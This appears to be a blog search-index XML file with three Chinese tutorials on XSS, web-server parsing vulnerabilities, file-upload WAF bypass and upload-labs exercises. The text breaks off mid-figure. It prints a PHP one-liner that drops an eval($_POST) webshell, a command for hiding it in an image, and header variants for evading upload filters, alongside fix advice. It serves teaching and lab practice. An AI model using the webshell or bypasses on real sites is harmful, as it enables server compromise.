<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS跨站脚本攻击漏洞</title>
      <link href="/2023/10/10/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/10/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h1><h2 id="什么是跨站脚本攻击"><a href="#什么是跨站脚本攻击" class="headerlink" title="什么是跨站脚本攻击"></a>什么是跨站脚本攻击</h2><ul><li>跨站脚本攻击（Cross-site scripting，XSS）是一种常见的网络安全漏洞，攻击者通过在受害网站注入恶意脚本代码，使得其他用户访问该网站时执行这些恶意代码，从而达到攻击的目的。</li></ul><h2 id="有什么危害"><a href="#有什么危害" class="headerlink" title="有什么危害"></a>有什么危害</h2><ul><li>获取用户信息：(如浏览器信息、ip地址、cookie信息等）</li><li>钓鱼：(利用xss漏洞构造出一个登录框，骗取用户账户密码，提示登录过期，模拟一个网站的登录框，将用户名、密码发送到攻击者服务器）</li><li>注入木马或广告链接：(有些在主站注入非法网站的链接，对公司的声誉有一定的影响)·</li><li>后台增删改网站数据等操作：(配合CSR漏洞，骗取用户点击，利用s模拟浏览器发包）</li><li>xss蠕虫(微博蠕虫：只要看过某人的微博就是自动关注某人；贴吧蠕虫：看过某个帖子就是自动回复这个帖子)</li></ul><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XXS"><a href="#反射型XXS" class="headerlink" title="反射型XXS"></a>反射型XXS</h2><ul><li>反射型XSS，又称<strong>非持久型XSS</strong>，攻击相对于受害者而言是一次性的，具体表现在受害者点击了含有的恶意JavaScript脚本的url，恶意代码并没有保存在目标网站，而Web应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231118.png" alt="image.png"></li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；</li><li>攻击者需要诱骗点击；</li><li>反馈率低，所以较难发现和响应修复；</li><li>盗取用户敏感保密信息。</li></ol><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul><li>存储型XSS，又称<strong>持续型XSS</strong>，是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231135.png" alt="image.png"></li></ul><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>持久性，植入在数据库中；</li><li>危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；</li><li>盗取用户敏感私密信息。</li></ol><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><ul><li>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式，DOM-XSS简单理解就是不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231149.png" alt="image.png"></li></ul><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><h2 id="对输入和URL参数进行过滤-白名单和黑名单"><a href="#对输入和URL参数进行过滤-白名单和黑名单" class="headerlink" title="对输入和URL参数进行过滤(白名单和黑名单)"></a>对输入和URL参数进行过滤(白名单和黑名单)</h2><p>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。</p><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>字符串js编码转换成实体html编码的方法（防范XSS攻击）<br><a href="https://www.cnblogs.com/dearxinli/p/5466286.html">https://www.cnblogs.com/dearxinli/p/5466286.html</a></p><h2 id="对输出内容进行编码"><a href="#对输出内容进行编码" class="headerlink" title="对输出内容进行编码"></a>对输出内容进行编码</h2><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞文件上传（2）</title>
      <link href="/2023/10/10/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/"/>
      <url>/2023/10/10/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="解析漏洞解释"><a href="#解析漏洞解释" class="headerlink" title="解析漏洞解释"></a>解析漏洞解释</h2><ul><li>解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候，会将相关的文件解析成网页的脚本，从而导致实现控制网站，同时大部分的解析漏洞都是由应用程序产生的。</li></ul><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><h3 id="IIS5-0-6-0"><a href="#IIS5-0-6-0" class="headerlink" title="IIS5.0&#x2F;6.0"></a>IIS5.0&#x2F;6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><ul><li>在以<code>. asp</code>文件名的文件夹下的任何文件都将作为asp文件执行。</li><li>也就是当目录为<code>XX.asp</code>的时候，那么当访问下面的图片的时候，如<code>XX.aps/1.jpg</code>就会被当作ASP执行。</li></ul><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><ul><li>如果文件为<code>1.asp;.jpg</code>，由于IIS不解析;后面的内容，使用就会把文件当作1.asp进行解析，同时还存在<code>.asa</code>、<code>.cer</code>、<code>.cdx</code>可以进行解析。</li></ul><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>限制上传目录的执行权限，不允许执行脚本。</li><li>不允许创建目录。</li><li>上传的文件进行重命名。</li></ol><h3 id="IIS7-0-7-5"><a href="#IIS7-0-7-5" class="headerlink" title="IIS7.0&#x2F;7.5"></a>IIS7.0&#x2F;7.5</h3><h4 id="IIS7-0-IIS7-0Fash-CGI"><a href="#IIS7-0-IIS7-0Fash-CGI" class="headerlink" title="IIS7.0&#x2F;IIS7.0Fash-CGI"></a>IIS7.0&#x2F;IIS7.0Fash-CGI</h4><ul><li>在Fast-CGI开启的状态下，在类似1.jpg后面加上&#x2F;1.php,变成&#x2F;1.jpg&#x2F;1.php路径会解析成PHP文件。需要进入php.ini里面修改cig.cgi_ pathinfo&#x3D;1。</li><li>将1.txt文本文件中的后门代码写入到1.jpg图片的二进制代码：<code>copy 1.jpg/b + 1.txt/a 1.jpg</code></li><li>1.txt的文件内容为：<code>&lt;?PHPfputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[password])?&gt;&#39;);?&gt;</code></li><li>当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</li></ul><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序</li></ul><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><h3 id="apache解析漏洞-1"><a href="#apache解析漏洞-1" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><ul><li>在apache1.x和apache2.x中存在解析漏洞。</li><li>当一个文件为1.php.yy.xx的时候就会被当作php执行，这是由于在apache解析文件的时候有一个原则就是，以.后面的扩展名来解析，当遇见不认识的扩展名的时候，就会向前解析，直到遇到能够解析的后缀名为止。</li><li>如：1.php.yy.xx，首先会解析xx，xx无法解析就会去解析yy，yy无法解析就会去解析php，那么php是能够解析了，那么就会结束。</li><li>这种方式多用于绕过黑名单的检查。</li></ul><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>更新至最新版本。</li><li>将上传的文件进行重命名。</li></ol><h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx&lt;8.03"></a>nginx&lt;8.03</h3><h4 id="nginx配置文件错误"><a href="#nginx配置文件错误" class="headerlink" title="nginx配置文件错误"></a>nginx配置文件错误</h4><ul><li>由于nginx默认是用cgi解析php的，因此和iis一样可以制作图片马进行上传。</li><li>当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</li></ul><h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序</li><li>或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。 或将上传存储的内容与网站分离，即站库分离。</li><li>或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions &#x3D; .php</li></ol><h3 id="nginx0-5-0-6-0-7"><a href="#nginx0-5-0-6-0-7" class="headerlink" title="nginx0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37"></a>nginx0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37</h3><h4 id="nginx空字节任意代码执行"><a href="#nginx空字节任意代码执行" class="headerlink" title="nginx空字节任意代码执行"></a>nginx空字节任意代码执行</h4><ul><li>当使用PHP-FastCGI执行PHP时，遇到url里面存在%00空字节时与FastCGI的处理不一致，导致可在非PHP文件中嵌入PHP代码，通过访问url+%00.PHP来执行其中的PHP代码。</li><li>比如上传一张图片马1.jpg，那么当访问这个图片马的时在1.jpg后面添加%00.php就会将图片马以php执行。</li></ul><h4 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>升级nginx版本。</li></ol><h1 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h1><ul><li>编辑器也就是在线的web编辑器，比如在搭建博客后需要发布文章，那么用来发布文章的界面就是web编辑器。当然web编辑器有很多，如：UEDITOR（百度）、eWebEdit、FCKeditor、CKEditor（新版fck）、Kindeditor、DotNetTextBox、CuteEditor等等。</li></ul><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><h2 id="WAF绕过解释"><a href="#WAF绕过解释" class="headerlink" title="WAF绕过解释"></a>WAF绕过解释</h2><ul><li>waf绕过其实就是将数据包截获到，对里面的内容进行解析，比如对文件的后缀名就判断是否在相应的黑名单中，文件内容中是否存在webshell代码。</li><li>总的来说文件上传都是在数据包中进行各种操作来进行绕过。</li></ul><h2 id="上传参数名解析"><a href="#上传参数名解析" class="headerlink" title="上传参数名解析"></a>上传参数名解析</h2><ul><li><code>Content-Disposition</code>：一般可更改</li><li><code>name</code>：表单参数值，不能更改</li><li><code>filename</code>：文件名，可以更改</li><li><code>Content-Type</code>：文件MIME，视情况更改</li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><h4 id="form-data与name之间"><a href="#form-data与name之间" class="headerlink" title="form-data与name之间"></a>form-data与name之间</h4><ul><li>在form-data;与name&#x3D;”upload_file”; filename&#x3D;”2.php”之间添加大量的垃圾数据，可以边添加边测试直到上传上去，主要添加的垃圾数据需要在后面添加一个”;”进行结尾。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010204737.png" alt="image.png"></li></ul><h4 id="name与filename之间"><a href="#name与filename之间" class="headerlink" title="name与filename之间"></a>name与filename之间</h4><ul><li>当然这里不单单可以插入在form-data;与name&#x3D;”upload_file”; filename&#x3D;”2.php”之间，也可以在name&#x3D;”upload_file”; 与filename&#x3D;”2.php”之间。但是数据不能乱插入，比如你插在2.php中，那肯定不行，一般情况下，文件名称长度都可能存在限制，并且太长也上传不上去。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010205005.png" alt="image.png"></li></ul><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><ul><li>符号变异也就是将单双引号变换使用，或者单双引号缺失一部分进行使用，或者不使用单双引号来进行绕过。目前测试好像是无法通过了。</li></ul><h4 id="filename符号变异"><a href="#filename符号变异" class="headerlink" title="filename符号变异"></a>filename符号变异</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&#x27;2.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=2.php</span><br></pre></td></tr></table></figure><h4 id="form-data符号变异"><a href="#form-data符号变异" class="headerlink" title="form-data符号变异"></a>form-data符号变异</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:&quot;form-data&quot;; name=upload_file; filename=&quot;2.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Disposition:&#x27;form-data&#x27;; name=&quot;upload_file&quot;; filename=&#x27;2.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><h4 id="回车换行"><a href="#回车换行" class="headerlink" title="回车换行"></a>回车换行</h4><ul><li>通过换行来实现绕过，但是中间不能有空行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010205522.png" alt="image.png"></li></ul><h4 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h4><ul><li>若WAF匹配文件名到分号截止，则可以绕过。</li></ul><h3 id="字段名变换"><a href="#字段名变换" class="headerlink" title="字段名变换"></a>字段名变换</h3><h4 id="大小写变换"><a href="#大小写变换" class="headerlink" title="大小写变换"></a>大小写变换</h4><ul><li>对这三个字段进行大小写进行变换，比如将<code>name</code>换成<code>Name</code>、<code>Content-Disposition</code>换成<code>content-disposition</code>等等。</li></ul><h4 id="顺序颠倒"><a href="#顺序颠倒" class="headerlink" title="顺序颠倒"></a>顺序颠倒</h4><ul><li>针对<code>name</code>和<code>filename</code>这两个字段，我们可以尝试交换<code>name</code>和<code>filename</code>的顺序。（由于有规定<code>Content-Dispositon</code>必须在前面，因此我们不能修改该字段的内容）</li></ul><h3 id="重复数据"><a href="#重复数据" class="headerlink" title="重复数据"></a>重复数据</h3><ul><li>通过设置多个参数进行匹配，避免被匹配到。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;......filename=&quot;2.php&quot;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>比较全的文件上传漏洞WAF拦截绕过总结：<a href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></li></ul><h1 id="文件上传修复"><a href="#文件上传修复" class="headerlink" title="文件上传修复"></a>文件上传修复</h1><ul><li>后端验证：针对后端验证的可以采用通过服务器进行验证。</li><li>后缀检测：利用黑白名单进行过滤，当然最好是使用白名单，黑名单有时候总归会存在一些未想到的后缀，而白名单就相对简单一点，只需要想放通哪些后缀即可，而且防范更好一些。</li><li>上传目录：对上传文件到的目录可以设置一个不可执行的权限。</li><li>文件名：针对文件名可以自定义一些随机数以及一些其他的内容进行二次修改，从而改变文件的名称。</li><li>内容检测：可以使用文件头，完整性检测，最好能够对内容的数据进行判断是否存在一些webxshll类似的代码，若出现这类代码，直接删除。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞文件上传</title>
      <link href="/2023/10/08/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/10/08/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h1><ul><li>文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。</li><li>如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。</li></ul><h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><ul><li>文件上传漏洞是指用户通过界面上的上传功能上传了一个可执行的脚本文件，而WEB端的系统并未对其进行检测或者检测的逻辑做的不够好。</li><li>通常来说文件上传功能是没有问题的，主要是服务器如何对上传的文件如何进行处理。</li><li>若WEB未对用户上传的文件进行有效的审查，若存在恶意用户对其上传一句话木马，从而实现控制WEB网站的目的。</li></ul><h1 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h1><ul><li>Webshell是一种网页后门，通常用asp、jsp或者php编写。</li><li>WebShell的常见的功能有执行系统命令、窃取用户数据、删除web页面、修改主页等。黑客在入侵了一个网站后，常常在将这些asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。</li></ul><h2 id="Webshell的分类"><a href="#Webshell的分类" class="headerlink" title="Webshell的分类"></a>Webshell的分类</h2><table><thead><tr><th><strong>分类</strong></th><th><strong>体量</strong></th><th><strong>特点</strong></th></tr></thead><tbody><tr><td>大马</td><td>体积大，包含很多功能</td><td>通常会包含调用系统的关键函数，所以通常会加密代码用来隐藏。</td></tr><tr><td>小马</td><td>体积小，通常只包含文件上传功能</td><td>同上</td></tr><tr><td>一句话木马</td><td>代码极短（只有一行）</td><td>使用方便，可以单独作为一个文件，也可以插入其他正常文件中；变形多，难以查杀。</td></tr></tbody></table><h1 id="文件上传实战思路"><a href="#文件上传实战思路" class="headerlink" title="文件上传实战思路"></a>文件上传实战思路</h1><ul><li>文件上传和文件执行是两个东西</li><li>漏洞分类：解析漏洞、cms漏洞、其他漏洞（编辑器漏洞、cve漏洞、安全修复）</li><li>思路：如果有一个网站，要从文件上传的方向开始</li><li>第一步：先看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;</li><li>如果有，如何找：</li><li>字典扫描：扫描会员中心，文件上传的位置</li><li>找到后，如何利用：</li><li>验证&#x2F;绕过</li></ul><h1 id="文件上传绕过分类"><a href="#文件上传绕过分类" class="headerlink" title="文件上传绕过分类"></a>文件上传绕过分类</h1><h2 id="JS类防护"><a href="#JS类防护" class="headerlink" title="JS类防护"></a>JS类防护</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>JS防护就是将上传的文件进行一个格式的验证，但是JS类的防护是用户可以控制的，所有前端的所有验证都是不安全的。</li></ul><h3 id="实例upload-labs-Pass01"><a href="#实例upload-labs-Pass01" class="headerlink" title="实例upload-labs-Pass01"></a>实例upload-labs-Pass01</h3><ul><li>通过禁用界面JS处理，可以禁用JS防护</li><li>在火狐安装插件javascript switcher，可以一键禁用JS处理<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008225253.png" alt="image.png"></li><li>在upload下就可以看到我们上传的文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008225334.png" alt="image.png"></li></ul><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><ul><li>黑名单就是服务端明确不让上传的格式后缀，例如：rar、php、zip等。</li></ul><h3 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>特殊解析后缀绕过是由于黑名单过滤规则不严谨，在某些特定的情况下的后缀也能够被当作php文件进行解析，例如PHP2、php3、php4、phtml、pht等情况。</li><li>可以使用phtml、php3、php4、php5，当然前提是apache服务器，同时在配置文件夹中需要有将AddType application&#x2F;x-httpd-php .php .phtml .phps .php1 .php4 .pht 这样的一段话前面的注释删除，重启phpstudy让其生效。</li></ul><h4 id="实例upload-labs-Pass03"><a href="#实例upload-labs-Pass03" class="headerlink" title="实例upload-labs-Pass03"></a>实例upload-labs-Pass03</h4><ul><li>禁止<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>类型进行上传</li><li>将php文件后缀改为phtml进行绕过，实现文件上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008230836.png" alt="image.png"></li></ul><h3 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h3><h4 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置</li><li>通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</li></ul><h4 id="实例upload-labs-Pass04"><a href="#实例upload-labs-Pass04" class="headerlink" title="实例upload-labs-Pass04"></a>实例upload-labs-Pass04</h4><ul><li>通过源码得知第三关使用的phtml被限制了，并且设定了更多的特殊解析后缀，所以使用特殊解析后缀已经无法绕过了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008231355.png" alt="image.png"></li><li>这里就可以使用到<code> .htaccess</code>进行绕过测试。</li><li>创建一个 <code>.htaccess</code>文件，使用notepad++编辑<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008232814.png" alt="image.png"></li><li>然后将<code>.htaccess</code>文件上传，再将php文件改为<code>.jpg</code>文件上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104431.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104445.png" alt="image.png"></li><li>可以看到已经成功上传文件了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104909.png" alt="image.png"></li></ul><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>后缀大小写是通过服务端未将后缀进行统一的格式转换，导致可以上传PHP的文件，同时由于Windows系统对后缀大小写并不敏感，所以当在写PHP的改成Php就会被当作PHP进行解析。</li></ul><h4 id="实例upload-labs-Pass05"><a href="#实例upload-labs-Pass05" class="headerlink" title="实例upload-labs-Pass05"></a>实例upload-labs-Pass05</h4><ul><li>通过源码可知，其未对大小写进行限制，我们可以对php后缀进行大小写变形<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009105223.png" alt="image.png"></li><li>上传文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009105402.png" alt="image.png"></li></ul><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><h4 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>点绕过其实就是利用了Windows对文件和文件名的限制，当将点放在结尾的时候，就会触发操作系统的命名规范问题，所以在生成文件的时候，添加在结尾的点就会被去除。</li></ul><h4 id="实例upload-labs-Pass07"><a href="#实例upload-labs-Pass07" class="headerlink" title="实例upload-labs-Pass07"></a>实例upload-labs-Pass07</h4><ul><li>通过源码发现，本关并未对结尾点进行检测。</li><li>那么这里就可以通过在后缀加上点进行绕过，触发操作系统的命名规范，就会将结尾的点去除<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111050.png" alt="image.png"></li><li>burp抓包在结尾加个点就可以绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111203.png" alt="image.png"></li><li>可以看见成功上传了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111305.png" alt="image.png"></li></ul><h4 id="实例upload-labs-Pass09"><a href="#实例upload-labs-Pass09" class="headerlink" title="实例upload-labs-Pass09"></a>实例upload-labs-Pass09</h4><ul><li>通过源码发现，加一个点会被过滤</li><li>但是只是过滤一次，所有可以加两个点<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111429.png" alt="image.png"></li><li>只需要与Pass07相同的方法，结尾加两个点即可</li></ul><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>其实空格绕过和点绕过是一样的，都是利用操作系统的特性来进行解析绕过。</li></ul><h4 id="实例upload-labs-Pass06"><a href="#实例upload-labs-Pass06" class="headerlink" title="实例upload-labs-Pass06"></a>实例upload-labs-Pass06</h4><ul><li>通过源码发现，没有对结尾空格进行限制，所有我们可以在结尾加空格进行绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111938.png" alt="image.png"></li><li>成功绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009112000.png" alt="image.png"></li></ul><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><h4 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</li></ul><h4 id="实例upload-labs-Pass08"><a href="#实例upload-labs-Pass08" class="headerlink" title="实例upload-labs-Pass08"></a>实例upload-labs-Pass08</h4><ul><li>通过源码可知，没有为<code>::$DATA</code>的检测<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009112905.png" alt="image.png"></li><li>在文件结尾加<code>::$DATA</code>就可以绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009113123.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009113158.png" alt="image.png"></li></ul><h3 id="双后缀名绕过"><a href="#双后缀名绕过" class="headerlink" title="双后缀名绕过"></a>双后缀名绕过</h3><h4 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务端可能存在将后缀替换为空的情况，但是这就存在一种可能就是在编辑过滤的时候只过滤了一次，所以就出现了可以通过双写就绕过的可能。</li></ul><h4 id="实例upload-labs-Pass10"><a href="#实例upload-labs-Pass10" class="headerlink" title="实例upload-labs-Pass10"></a>实例upload-labs-Pass10</h4><ul><li>通过源码可以知道，上传指定的文件后缀，会被替换成空，但是只替换一次<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150200.png" alt="image.png"></li><li>那么就可以通过双后缀的方式绕过</li><li>由于过滤是从左往右，例如p<strong>php</strong>hp会被过滤成php<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150658.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150752.png" alt="image.png"></li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul><li>白名单就是服务端明确可以上传的格式后缀，例如：jpg、png、jpeg等。</li></ul><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务端MIME类型检测是通过检查http中包含的Content-Type字段中的值来判断上传文件是否合法的。</li><li>利用Burp抓包，将报文中的Content-Type改成允许的类型<figure class="highlight plaintext"><table><tr><td 